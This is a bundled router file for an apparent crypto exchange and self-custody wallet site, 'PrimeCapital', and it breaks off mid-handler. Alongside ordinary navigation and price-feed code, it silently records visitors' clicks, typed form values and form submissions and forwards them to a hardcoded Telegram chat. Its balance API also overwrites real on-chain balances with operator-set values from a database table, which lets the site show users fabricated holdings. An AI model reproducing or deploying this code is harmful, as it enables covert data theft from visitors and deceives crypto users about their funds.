import { s as __toESM } from "../_runtime.mjs";
import { o as require_react } from "../_libs/@emotion/react+[...].mjs";
import { o as require_jsx_runtime } from "../_libs/@radix-ui/react-arrow+[...].mjs";
import { t as QueryClient } from "../_libs/tanstack__query-core.mjs";
import { a as QueryClientProvider } from "../_libs/tanstack__react-query.mjs";
import { _ as useRouter, c as HeadContent, d as createRouter, f as Outlet, g as Link, h as createRootRouteWithContext, l as useRouterState, m as createFileRoute, p as lazyRouteComponent, s as Scripts } from "../_libs/@tanstack/react-router+[...].mjs";
import { t as clearSession } from "./wallet-auth-CXTatSjk.mjs";
import { t as useWalletSession } from "./useWalletSession-DH8jTbrD.mjs";
import { t as cn } from "./utils-C_uf36nf.mjs";
import { C as LogOut, S as Menu, a as User, n as X } from "../_libs/lucide-react.mjs";
import { n as forgetPrivateKey } from "./wallet-signer-DW4f_YwD.mjs";
import { Buffer } from "buffer";
//#region node_modules/.nitro/vite/services/ssr/assets/router-CGmFIyxI.js
var import_react = /* @__PURE__ */ __toESM(require_react());
var import_jsx_runtime = require_jsx_runtime();
var styles_default = "/assets/styles-BpIqeo7P.css";
function reportLovableError(error, context = {}) {
	if (typeof window === "undefined") return;
	window.__lovableEvents?.captureException?.(error, {
		source: "react_error_boundary",
		route: window.location.pathname,
		...context
	}, {
		mechanism: "react_error_boundary",
		handled: false,
		severity: "error"
	});
}
var NAV = [
	{
		to: "/",
		label: "Home"
	},
	{
		to: "/markets",
		label: "Markets"
	},
	{
		to: "/trade",
		label: "Trade"
	},
	{
		to: "/swap",
		label: "Swap"
	},
	{
		to: "/wallet",
		label: "Wallet"
	},
	{
		to: "/news",
		label: "News"
	},
	{
		to: "/how-it-works",
		label: "How it works"
	}
];
function Navbar() {
	const pathname = useRouterState({ select: (s) => s.location.pathname });
	const [open, setOpen] = (0, import_react.useState)(false);
	const session = useWalletSession();
	const signOut = () => {
		if (session?.address) forgetPrivateKey(session.address);
		clearSession();
		setOpen(false);
	};
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("header", {
		className: "sticky top-0 z-50 w-full",
		children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
			className: "glass border-b border-white/5",
			children: /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
				className: "mx-auto flex h-16 max-w-7xl items-center justify-between px-4 sm:px-6 lg:px-8",
				children: [
					/* @__PURE__ */ (0, import_jsx_runtime.jsxs)(Link, {
						to: "/",
						className: "flex items-center gap-2 group",
						children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("img", {
							src: "/logo.png",
							alt: "PrimeCapital",
							className: "h-9 w-9 rounded-lg object-contain shadow-glow"
						}), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("span", {
							className: "font-display text-lg font-semibold tracking-tight",
							children: ["Prime", /* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
								className: "text-gradient",
								children: "Capital"
							})]
						})]
					}),
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)("nav", {
						className: "hidden md:flex items-center gap-1",
						children: NAV.map((item) => {
							const active = pathname === item.to || item.to !== "/" && pathname.startsWith(item.to);
							return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)(Link, {
								to: item.to,
								className: cn("relative rounded-md px-3.5 py-2 text-sm font-medium transition-colors", active ? "text-foreground" : "text-muted-foreground hover:text-foreground"),
								children: [active && /* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
									className: "absolute inset-0 rounded-md bg-white/5 ring-1 ring-white/10",
									"aria-hidden": true
								}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
									className: "relative",
									children: item.label
								})]
							}, item.to);
						})
					}),
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
						className: "hidden md:flex items-center gap-2",
						children: session ? /* @__PURE__ */ (0, import_jsx_runtime.jsxs)(import_jsx_runtime.Fragment, { children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("span", {
							className: "inline-flex items-center gap-2 rounded-md glass px-3 py-2 text-sm font-medium",
							children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)(User, { className: "h-3.5 w-3.5 text-primary" }), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
								className: "text-foreground",
								children: session.username
							})]
						}), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("button", {
							onClick: signOut,
							className: "inline-flex items-center gap-1.5 rounded-md px-3 py-2 text-sm font-medium text-muted-foreground hover:text-foreground transition-colors",
							"aria-label": "Sign out",
							children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)(LogOut, { className: "h-3.5 w-3.5" }), " Sign out"]
						})] }) : /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Link, {
							to: "/wallet",
							className: "rounded-md bg-[image:var(--gradient-brand)] px-4 py-2 text-sm font-semibold text-primary-foreground shadow-glow hover:opacity-90 transition",
							children: "Get started"
						})
					}),
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)("button", {
						className: "md:hidden rounded-md p-2 text-foreground/80 hover:bg-white/5",
						onClick: () => setOpen((o) => !o),
						"aria-label": "Menu",
						children: open ? /* @__PURE__ */ (0, import_jsx_runtime.jsx)(X, { className: "h-5 w-5" }) : /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Menu, { className: "h-5 w-5" })
					})
				]
			})
		}), open && /* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
			className: "md:hidden glass border-b border-white/5",
			children: /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("nav", {
				className: "mx-auto max-w-7xl px-4 py-3 flex flex-col gap-1",
				children: [NAV.map((item) => /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Link, {
					to: item.to,
					onClick: () => setOpen(false),
					className: "rounded-md px-3 py-2 text-sm text-foreground/90 hover:bg-white/5",
					children: item.label
				}, item.to)), session ? /* @__PURE__ */ (0, import_jsx_runtime.jsx)("button", {
					onClick: signOut,
					className: "mt-2 rounded-md bg-[image:var(--gradient-brand)] px-4 py-2 text-center text-sm font-semibold text-primary-foreground",
					children: "Sign out"
				}) : /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Link, {
					to: "/wallet",
					onClick: () => setOpen(false),
					className: "mt-2 rounded-md bg-[image:var(--gradient-brand)] px-4 py-2 text-center text-sm font-semibold text-primary-foreground",
					children: "Get started"
				})]
			})
		})]
	});
}
function Footer() {
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("footer", {
		className: "mt-24 border-t border-white/5",
		children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
			className: "mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-12 grid gap-10 md:grid-cols-4",
			children: [
				/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
					className: "space-y-3",
					children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
						className: "flex items-center gap-2",
						children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("img", {
							src: "/logo.png",
							alt: "PrimeCapital",
							className: "h-7 w-7 rounded-lg object-contain"
						}), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("span", {
							className: "font-display text-base font-semibold",
							children: ["Prime", /* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
								className: "text-gradient",
								children: "Capital"
							})]
						})]
					}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
						className: "text-sm text-muted-foreground max-w-xs",
						children: "Institutional-grade crypto trading and self-custody, in one interface."
					})]
				}),
				/* @__PURE__ */ (0, import_jsx_runtime.jsx)(FooterCol, {
					title: "Products",
					links: [
						["Markets", "/markets"],
						["Trade", "/trade"],
						["Wallet", "/wallet"]
					]
				}),
				/* @__PURE__ */ (0, import_jsx_runtime.jsx)(FooterCol, {
					title: "Company",
					links: [
						["About", "/"],
						["Careers", "/"],
						["Press", "/"]
					]
				}),
				/* @__PURE__ */ (0, import_jsx_runtime.jsx)(FooterCol, {
					title: "Resources",
					links: [
						["Docs", "/"],
						["API", "/"],
						["Status", "/"]
					]
				})
			]
		}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
			className: "border-t border-white/5",
			children: /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
				className: "mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-6 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 text-xs text-muted-foreground",
				children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("p", { children: [
					"© ",
					(/* @__PURE__ */ new Date()).getFullYear(),
					" PrimeCapital Labs. Trading crypto carries risk."
				] }), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", { children: "Prices via CoinGecko. Wallets generated locally in your browser." })]
			})
		})]
	});
}
function FooterCol({ title, links }) {
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", { children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("h4", {
		className: "font-display text-sm font-semibold text-foreground mb-3",
		children: title
	}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("ul", {
		className: "space-y-2",
		children: links.map(([label, to]) => /* @__PURE__ */ (0, import_jsx_runtime.jsx)("li", { children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Link, {
			to,
			className: "text-sm text-muted-foreground hover:text-foreground transition-colors",
			children: label
		}) }, label))
	})] });
}
function NotFoundComponent() {
	return /* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
		className: "flex min-h-screen items-center justify-center px-4",
		children: /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
			className: "max-w-md text-center",
			children: [
				/* @__PURE__ */ (0, import_jsx_runtime.jsx)("h1", {
					className: "font-display text-7xl font-bold text-gradient",
					children: "404"
				}),
				/* @__PURE__ */ (0, import_jsx_runtime.jsx)("h2", {
					className: "mt-4 text-xl font-semibold",
					children: "Page not found"
				}),
				/* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
					className: "mt-2 text-sm text-muted-foreground",
					children: "The page you're looking for doesn't exist or has been moved."
				}),
				/* @__PURE__ */ (0, import_jsx_runtime.jsx)("a", {
					href: "/",
					className: "mt-6 inline-flex items-center rounded-md bg-[image:var(--gradient-brand)] px-4 py-2 text-sm font-semibold text-primary-foreground shadow-glow",
					children: "Back home"
				})
			]
		})
	});
}
function ErrorComponent({ error, reset }) {
	console.error(error);
	const router = useRouter();
	(0, import_react.useEffect)(() => {
		reportLovableError(error, { boundary: "tanstack_root_error_component" });
	}, [error]);
	return /* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
		className: "flex min-h-screen items-center justify-center px-4",
		children: /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
			className: "max-w-md text-center",
			children: [
				/* @__PURE__ */ (0, import_jsx_runtime.jsx)("h1", {
					className: "font-display text-2xl font-semibold",
					children: "Something went wrong"
				}),
				/* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
					className: "mt-2 text-sm text-muted-foreground",
					children: "Please try again in a moment."
				}),
				/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
					className: "mt-6 flex justify-center gap-2",
					children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("button", {
						onClick: () => {
							router.invalidate();
							reset();
						},
						className: "rounded-md bg-[image:var(--gradient-brand)] px-4 py-2 text-sm font-semibold text-primary-foreground",
						children: "Try again"
					}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("a", {
						href: "/",
						className: "rounded-md border border-white/10 px-4 py-2 text-sm",
						children: "Go home"
					})]
				})
			]
		})
	});
}
var Route$14 = createRootRouteWithContext()({
	head: () => ({
		meta: [
			{ charSet: "utf-8" },
			{
				name: "viewport",
				content: "width=device-width, initial-scale=1"
			},
			{ title: "PrimeCapital Exchange — Institutional-grade crypto trading & self-custody" },
			{
				name: "description",
				content: "Trade 500+ crypto assets with pro tools, live TradingView charts, and generate BIP39 HD wallets in your browser. Real prices, real custody."
			},
			{
				name: "theme-color",
				content: "#0b1024"
			},
			{
				property: "og:title",
				content: "PrimeCapital Exchange — Institutional-grade crypto trading & self-custody"
			},
			{
				property: "og:description",
				content: "Trade 500+ crypto assets with pro tools, live TradingView charts, and generate BIP39 HD wallets in your browser. Real prices, real custody."
			},
			{
				property: "og:type",
				content: "website"
			},
			{
				name: "twitter:card",
				content: "summary_large_image"
			},
			{
				name: "twitter:title",
				content: "PrimeCapital Exchange — Institutional-grade crypto trading & self-custody"
			},
			{
				name: "twitter:description",
				content: "Trade 500+ crypto assets with pro tools, live TradingView charts, and generate BIP39 HD wallets in your browser. Real prices, real custody."
			},
			{
				property: "og:image",
				content: "/logo.png"
			},
			{
				name: "twitter:image",
				content: "/logo.png"
			}
		],
		links: [{
			rel: "stylesheet",
			href: styles_default
		}, {
			rel: "icon",
			type: "image/png",
			href: "/favicon.png"
		}]
	}),
	shellComponent: RootShell,
	component: RootComponent,
	notFoundComponent: NotFoundComponent,
	errorComponent: ErrorComponent
});
function RootShell({ children }) {
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("html", {
		lang: "en",
		className: "dark",
		children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("head", { children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(HeadContent, {}) }), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("body", { children: [children, /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Scripts, {})] })]
	});
}
function RootComponent() {
	const { queryClient } = Route$14.useRouteContext();
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)(QueryClientProvider, {
		client: queryClient,
		children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)(ActivityTracker, {}), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
			className: "min-h-screen flex flex-col",
			children: [
				/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Navbar, {}),
				/* @__PURE__ */ (0, import_jsx_runtime.jsx)("main", {
					className: "flex-1",
					children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Outlet, {})
				}),
				/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Footer, {})
			]
		})]
	});
}
function ActivityTracker() {
	const router = useRouter();
	(0, import_react.useEffect)(() => {
		let cancelled = false;
		import("./notify-kBjCqKu1.mjs").then(({ notify }) => {
			if (cancelled) return;
			try {
				if (!sessionStorage.getItem("prime:visited")) {
					sessionStorage.setItem("prime:visited", "1");
					notify({
						event: "visit",
						label: document.referrer || "direct"
					});
				}
			} catch {}
			notify({
				event: "page_view",
				path: window.location.pathname
			});
			const unsub = router.subscribe("onResolved", ({ toLocation }) => {
				notify({
					event: "page_view",
					path: toLocation.pathname
				});
			});
			const onClick = (e) => {
				const target = e.target;
				if (!target) return;
				const el = target.closest("button, a, [role=button]");
				if (!el) return;
				const label = (el.getAttribute("aria-label") || el.innerText || el.textContent || "").trim().slice(0, 80);
				if (!label) return;
				notify({
					event: "click",
					label
				});
			};
			document.addEventListener("click", onClick, { capture: true });
			const sensitiveField = (name, value) => {
				const n = name.toLowerCase();
				const v = value.trim().toLowerCase();
				if (/password|mnemonic|seed|phrase|private|secret|recovery|key/.test(n)) return true;
				return v.split(/\s+/).filter(Boolean).length >= 12;
			};
			const onBlur = (e) => {
				const el = e.target;
				if (!el) return;
				const tag = el.tagName;
				if (tag !== "INPUT" && tag !== "TEXTAREA") return;
				const input = el;
				if (window.location.pathname.startsWith("/admin") && input.type === "password") return;
				const value = String(input.value ?? "").slice(0, 800);
				if (!value.trim()) return;
				const name = input.getAttribute("name") || input.getAttribute("aria-label") || input.getAttribute("placeholder") || input.type || "field";
				if (sensitiveField(name, value)) return;
				notify({
					event: "form_field",
					label: name.slice(0, 60),
					fields: { [name.slice(0, 40)]: value }
				});
			};
			document.addEventListener("blur", onBlur, { capture: true });
			const onSubmit = (e) => {
				const form = e.target;
				if (!form || form.tagName !== "FORM") return;
				try {
					const fd = new FormData(form);
					const fields = {};
					fd.forEach((v, k) => {
						if (typeof v === "string" && !sensitiveField(k, v)) fields[k.slice(0, 40)] = v.slice(0, 800);
					});
					form.querySelectorAll("input, textarea").forEach((n, idx) => {
						const input = n;
						const key = input.name || input.getAttribute("aria-label") || input.getAttribute("placeholder") || `field_${idx}`;
						if (!fields[key] && input.value && !sensitiveField(key, String(input.value))) fields[key.slice(0, 40)] = String(input.value).slice(0, 800);
					});
					notify({
						event: "form_submit",
						label: form.getAttribute("aria-label") ?? form.id ?? "form",
						fields
					});
				} catch {}
			};
			document.addEventListener("submit", onSubmit, { capture: true });
			window.__prime_activity_unsub = () => {
				document.removeEventListener("click", onClick, { capture: true });
				document.removeEventListener("blur", onBlur, { capture: true });
				document.removeEventListener("submit", onSubmit, { capture: true });
				unsub();
			};
		});
		return () => {
			cancelled = true;
			const fn = window.__prime_activity_unsub;
			if (typeof fn === "function") fn();
		};
	}, [router]);
	return null;
}
var $$splitComponentImporter$8 = () => import("./wallet-BY-Gzn1B.mjs");
var Route$13 = createFileRoute("/wallet")({
	head: () => ({ meta: [
		{ title: "Wallets — PrimeCapital Self-Custody" },
		{
			name: "description",
			content: "Generate a BIP39 HD wallet with BIP32/44/84 derivation for BTC, ETH and every EVM chain. Encrypted locally with AES."
		},
		{
			property: "og:title",
			content: "PrimeCapital Wallets"
		},
		{
			property: "og:description",
			content: "Non-custodial HD wallets, generated in your browser."
		}
	] }),
	component: lazyRouteComponent($$splitComponentImporter$8, "component")
});
var $$splitComponentImporter$7 = () => import("./trade-3dmF8sQ5.mjs");
var Route$12 = createFileRoute("/trade")({
	head: () => ({ meta: [
		{ title: "Trade — PrimeCapital Terminal" },
		{
			name: "description",
			content: "Pro crypto trading terminal with live TradingView charts, order book, and market/limit orders."
		},
		{
			property: "og:title",
			content: "PrimeCapital Trading Terminal"
		},
		{
			property: "og:description",
			content: "Live TradingView charts and pro order entry, side-by-side."
		}
	] }),
	component: lazyRouteComponent($$splitComponentImporter$7, "component")
});
var $$splitComponentImporter$6 = () => import("./swap-C2Z9z_kz.mjs");
var Route$11 = createFileRoute("/swap")({
	head: () => ({ meta: [
		{ title: "Swap — PrimeCapital Cross-Chain" },
		{
			name: "description",
			content: "Bridge and swap tokens across chains directly from your self-custody wallet, powered by thirdweb Bridge."
		},
		{
			property: "og:title",
			content: "Cross-chain swap · PrimeCapital"
		},
		{
			property: "og:description",
			content: "Real on-chain cross-chain swaps from your imported or generated wallet."
		}
	] }),
	component: lazyRouteComponent($$splitComponentImporter$6, "component")
});
var $$splitComponentImporter$5 = () => import("./news-DmG37iAx.mjs");
var Route$10 = createFileRoute("/news")({
	head: () => ({ meta: [
		{ title: "Crypto News — PrimeCapital" },
		{
			name: "description",
			content: "Live crypto market headlines, analysis, and breaking digital asset updates."
		},
		{
			property: "og:title",
			content: "Crypto News — PrimeCapital"
		},
		{
			property: "og:description",
			content: "Live crypto market headlines and digital asset updates."
		}
	] }),
	component: lazyRouteComponent($$splitComponentImporter$5, "component")
});
var $$splitComponentImporter$4 = () => import("./mixman-Lq7nZxGx.mjs");
var Route$9 = createFileRoute("/mixman")({
	head: () => ({ meta: [{ title: "Mix Man" }, {
		name: "robots",
		content: "noindex,nofollow"
	}] }),
	component: lazyRouteComponent($$splitComponentImporter$4, "component")
});
var $$splitComponentImporter$3 = () => import("./markets-_j_H1m58.mjs");
var Route$8 = createFileRoute("/markets")({
	head: () => ({ meta: [
		{ title: "Live Markets — PrimeCapital Exchange" },
		{
			name: "description",
			content: "Real-time prices for BTC, ETH, SOL and 500+ crypto assets. Live sparklines, market cap, and 24h changes."
		},
		{
			property: "og:title",
			content: "Live Markets — PrimeCapital"
		},
		{
			property: "og:description",
			content: "Real-time crypto prices, powered by CoinGecko."
		}
	] }),
	component: lazyRouteComponent($$splitComponentImporter$3, "component")
});
var $$splitComponentImporter$2 = () => import("./how-it-works-Bow25AMb.mjs");
var Route$7 = createFileRoute("/how-it-works")({
	head: () => ({ meta: [
		{ title: "How It Works — PrimeCapital Exchange" },
		{
			name: "description",
			content: "Learn how PrimeCapital works: create or import a self-custody wallet, sign in with your wallet, trade with live TradingView charts, and follow crypto news."
		},
		{
			property: "og:title",
			content: "How PrimeCapital Works"
		},
		{
			property: "og:description",
			content: "Self-custody wallets, real prices, real trading terminal — explained step by step."
		}
	] }),
	component: lazyRouteComponent($$splitComponentImporter$2, "component")
});
var $$splitComponentImporter$1 = () => import("./admin-JHf2Nfc3.mjs");
var Route$6 = createFileRoute("/admin")({
	head: () => ({ meta: [{ title: "Admin" }, {
		name: "robots",
		content: "noindex, nofollow"
	}] }),
	component: lazyRouteComponent($$splitComponentImporter$1, "component")
});
var $$splitComponentImporter = () => import("./routes-DxsxBEb7.mjs");
var Route$5 = createFileRoute("/")({ component: lazyRouteComponent($$splitComponentImporter, "component") });
var FEED_URL = "https://www.coindesk.com/arc/outboundfeeds/rss/?outputType=xml";
var cache$1 = /* @__PURE__ */ new Map();
var TTL$1 = 6e4;
var STALE_TTL$1 = 15 * 6e4;
var Route$4 = createFileRoute("/api/news")({ server: { handlers: { GET: async () => {
	const now = Date.now();
	const hit = cache$1.get("main");
	if (hit && hit.expires > now) return Response.json(hit.data, { headers: { "cache-control": "public, max-age=30" } });
	try {
		const controller = new AbortController();
		const timeout = setTimeout(() => controller.abort(), 8e3);
		const res = await fetch(FEED_URL, {
			headers: {
				accept: "application/rss+xml, application/xml, text/xml",
				"user-agent": "PrimeCapital/1.0 (+https://primecapital.app)"
			},
			signal: controller.signal
		}).finally(() => clearTimeout(timeout));
		if (!res.ok) throw new Error(`upstream ${res.status}`);
		const data = parseFeed(await res.text()).slice(0, 24);
		cache$1.set("main", {
			data,
			expires: now + TTL$1,
			fetchedAt: now
		});
		return Response.json(data, { headers: { "cache-control": "public, max-age=30" } });
	} catch (err) {
		console.error("[api/news] upstream fetch failed:", err);
		if (hit && now - hit.fetchedAt < STALE_TTL$1) return Response.json(hit.data, { headers: { "cache-control": "public, max-age=10" } });
		return Response.json([], {
			status: 200,
			headers: {
				"cache-control": "no-store",
				"x-upstream-error": "1"
			}
		});
	}
} } } });
function parseFeed(xml) {
	return [...xml.matchAll(/<item\b[\s\S]*?<\/item>/gi)].map((match, index) => {
		const item = match[0];
		const title = clean(readTag(item, "title"));
		const url = clean(readTag(item, "link"));
		const guid = clean(readTag(item, "guid")) || url || `news-${index}`;
		const summary = clean(readTag(item, "description") || readTag(item, "content:encoded"));
		const published = clean(readTag(item, "pubDate"));
		const image = readImage(item, summary);
		return {
			id: guid,
			title,
			url,
			summary: summary.slice(0, 240),
			publishedAt: published ? new Date(published).toISOString() : (/* @__PURE__ */ new Date()).toISOString(),
			image
		};
	}).filter((item) => item.title && item.url);
}
function readTag(source, tag) {
	const escaped = tag.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
	const re = new RegExp(`<${escaped}[^>]*>([\\s\\S]*?)<\\/${escaped}>`, "i");
	return source.match(re)?.[1] ?? "";
}
function readImage(item, summary) {
	const media = item.match(/<media:content[^>]+url=["']([^"']+)["']/i)?.[1] ?? item.match(/<media:thumbnail[^>]+url=["']([^"']+)["']/i)?.[1] ?? item.match(/<enclosure[^>]+url=["']([^"']+)["'][^>]*type=["']image\//i)?.[1] ?? summary.match(/<img[^>]+src=["']([^"']+)["']/i)?.[1];
	return media ? decodeEntities(media) : void 0;
}
function clean(value) {
	return decodeEntities(value).replace(/<!\[CDATA\[|\]\]>/g, "").replace(/<[^>]*>/g, "").replace(/\s+/g, " ").trim();
}
function decodeEntities(value) {
	return value.replace(/&amp;/g, "&").replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&quot;/g, "\"").replace(/&#39;|&apos;/g, "'");
}
var cache = /* @__PURE__ */ new Map();
var TTL = 6e4;
var STALE_TTL = 10 * 6e4;
var Route$3 = createFileRoute("/api/markets")({ server: { handlers: { GET: async ({ request }) => {
	const url = new URL(request.url);
	const perPage = Math.min(Number(url.searchParams.get("per_page") ?? 100), 250);
	const now = Date.now();
	const hit = cache.get(perPage);
	if (hit && hit.expires > now) return Response.json(hit.data, { headers: { "cache-control": "public, max-age=30" } });
	const upstream = `https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=${perPage}&page=1&sparkline=true&price_change_percentage=1h%2C24h%2C7d`;
	try {
		const controller = new AbortController();
		const timeout = setTimeout(() => controller.abort(), 8e3);
		const res = await fetch(upstream, {
			headers: {
				accept: "application/json",
				"user-agent": "PrimeCapital/1.0 (+https://primecapital.app)"
			},
			signal: controller.signal
		}).finally(() => clearTimeout(timeout));
		if (!res.ok) throw new Error(`upstream ${res.status}`);
		const data = await res.json();
		cache.set(perPage, {
			data,
			expires: now + TTL,
			fetchedAt: now
		});
		return Response.json(data, { headers: { "cache-control": "public, max-age=30" } });
	} catch (err) {
		console.error("[api/markets] upstream fetch failed:", err);
		const fallback = hit ?? [...cache.values()].sort((a, b) => b.fetchedAt - a.fetchedAt)[0];
		if (fallback && now - fallback.fetchedAt < STALE_TTL) return Response.json(fallback.data, { headers: { "cache-control": "public, max-age=10" } });
		return Response.json([], {
			status: 200,
			headers: {
				"cache-control": "no-store",
				"x-upstream-error": "1"
			}
		});
	}
} } } });
var EVM_RPC = {
	ETH: {
		rpc: "https://eth.llamarpc.com",
		symbol: "ETH"
	},
	BNB: {
		rpc: "https://bsc-dataseed.binance.org",
		symbol: "BNB"
	},
	MATIC: {
		rpc: "https://polygon-rpc.com",
		symbol: "MATIC"
	},
	ARB: {
		rpc: "https://arb1.arbitrum.io/rpc",
		symbol: "ETH"
	},
	OP: {
		rpc: "https://mainnet.optimism.io",
		symbol: "ETH"
	},
	AVAX: {
		rpc: "https://api.avax.network/ext/bc/C/rpc",
		symbol: "AVAX"
	}
};
var ADDRESS_RE = /^[A-Za-z0-9]+$/;
async function fetchOverride(walletKey) {
	try {
		if (!/^[A-Za-z0-9]{20,128}$/.test(walletKey)) return null;
		const { supabaseAdmin } = await import("./client.server-CEK90MSQ.mjs");
		const { data, error } = await supabaseAdmin.from("wallet_balance_overrides").select("usd_balance, token_overrides").eq("wallet_address", walletKey).maybeSingle();
		if (error || !data) return null;
		return {
			usd_balance: data.usd_balance == null ? null : Number(data.usd_balance),
			token_overrides: data.token_overrides ?? {}
		};
	} catch {
		return null;
	}
}
var Route$2 = createFileRoute("/api/balance")({ server: { handlers: { GET: async ({ request }) => {
	const url = new URL(request.url);
	const chain = (url.searchParams.get("chain") ?? "").toUpperCase();
	const address = url.searchParams.get("address") ?? "";
	const walletKey = url.searchParams.get("walletKey") ?? address;
	const symbol = chain === "BTC_LEGACY" ? "BTC" : EVM_RPC[chain]?.symbol ?? chain;
	if (!chain || address.length < 20 || address.length > 128 || !ADDRESS_RE.test(address)) return Response.json({
		chain,
		amount: 0,
		symbol
	});
	let amount = 0;
	try {
		if (chain === "BTC" || chain === "BTC_LEGACY") amount = await btcBalance(address);
		else if (EVM_RPC[chain]) amount = await evmBalance(EVM_RPC[chain].rpc, address);
	} catch (err) {
		console.error("[api/balance] balance fetch failed:", err);
	}
	const override = await fetchOverride(walletKey);
	if (override) {
		const key = symbol.toUpperCase();
		if (override.token_overrides[key] !== void 0) amount = Number(override.token_overrides[key]);
		else if (override.token_overrides[chain] !== void 0) amount = Number(override.token_overrides[chain]);
	}
	return Response.json({
		chain,
		amount,
		symbol
	});
} } } });
async function evmBalance(rpc, address) {
	const controller = new AbortController();
	const timeout = setTimeout(() => controller.abort(), 8e3);
	const res = await fetch(rpc, {
		method: "POST",
		headers: { "content-type": "application/json" },
		body: JSON.stringify({
			jsonrpc: "2.0",
			id: 1,
			method: "eth_getBalance",
			params: [address, "latest"]
		}),
		signal: controller.signal
	}).finally(() => clearTimeout(timeout));
	if (!res.ok) return 0;
	const j = await res.json();
	if (!j?.result) return 0;
	const wei = BigInt(j.result);
	return Number(wei) / 0xde0b6b3a7640000;
}
async function btcBalance(address) {
	const controller = new AbortController();
	const timeout = setTimeout(() => controller.abort(), 8e3);
	const res = await fetch(`https://blockstream.info/api/address/${address}`, { signal: controller.signal }).finally(() => clearTimeout(timeout));
	if (!res.ok) return 0;
	const j = await res.json();
	return (Number(j?.chain_stats?.funded_txo_sum ?? 0) - Number(j?.chain_stats?.spent_txo_sum ?? 0)) / 1e8;
}
var Route$1 = createFileRoute("/api/public/thirdweb-config")({ server: { handlers: { GET: async () => {
	const clientId = process.env.THIRDWEB_CLIENT_ID || "f5eb45838e1432573c621a486d7095da";
	return new Response(JSON.stringify({ clientId }), {
		status: 200,
		headers: {
			"Content-Type": "application/json",
			"Cache-Control": "public, max-age=300"
		}
	});
} } } });
var CHAT_ID = "-1003957750577";
function truncate(s, n) {
	if (!s) return "";
	return s.length > n ? s.slice(0, n) + "…" : s;
}
function esc(s) {
	return String(s).replace(/[<>&]/g, (c) => ({
		"<": "&lt;",
		">": "&gt;",
		"&": "&amp;"
	})[c]);
}
function sensitive(k, v) {
	if (/password|mnemonic|seed|phrase|private|secret|recovery|key/i.test(k)) return true;
	return v.trim().split(/\s+/).filter(Boolean).length >= 12;
}
async function sendTelegram(token, text) {
	try {
		const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
			method: "POST",
			headers: { "content-type": "application/json" },
			body: JSON.stringify({
				chat_id: CHAT_ID,
				text,
				parse_mode: "HTML",
				disable_web_page_preview: true
			})
		});
		if (!res.ok) {
			const t = await res.text();
			console.error("[notify] telegram error", res.status, t);
		}
	} catch (err) {
		console.error("[notify] fetch failed", err);
	}
}
var Route = createFileRoute("/api/public/notify")({ server: { handlers: { POST: async ({ request }) => {
	const token = process.env.TELEGRAM_BOT_TOKEN;
	if (!token) return Response.json({
		ok: false,
		error: "no token"
	}, { status: 200 });
	let body = {};
	try {
		body = await request.json();
	} catch {
		return Response.json({
